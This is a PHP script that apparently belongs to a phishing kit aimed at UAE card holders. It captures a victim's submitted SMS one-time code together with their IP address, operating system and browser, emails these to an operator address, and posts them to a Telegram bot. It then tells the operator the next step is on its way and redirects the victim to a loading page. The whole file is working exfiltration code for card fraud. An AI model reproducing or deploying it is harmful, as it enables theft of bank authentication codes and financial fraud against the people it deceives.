﻿<?php

include("../config/Sys.php");
include "../config/n8.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeansms'] != "") )
{	
$hostname = gethostbyaddr($ip);
$message = "+-------------------+\n";
$message .= "* SMS : ".$_POST['jeansms']."\n";
$message .= "* IP   : $ip\n";
$message .= "* OS   : $user_os\n";
$message .= "* TIME : $date\n";
$message .= "* SUM  : $user_browser\n";
$message .= "+-------------------+\n";
$send = "$jean_email";
$subject = "UAE CARD SMS  [".$_POST['jeansms']."]";getISP($ip);
$headers = "From: ".$_POST['jeansms']." <uae@jeann8.com>";
mail($send,$subject,$message,$headers);
$data = [
    'text' => $message,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


	$infos = "[⚠️] SMS PAGE 3 ON WAY 15 sec";
    $data = [
    'text' => $infos,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}


header("Location: ../load_.php");

?>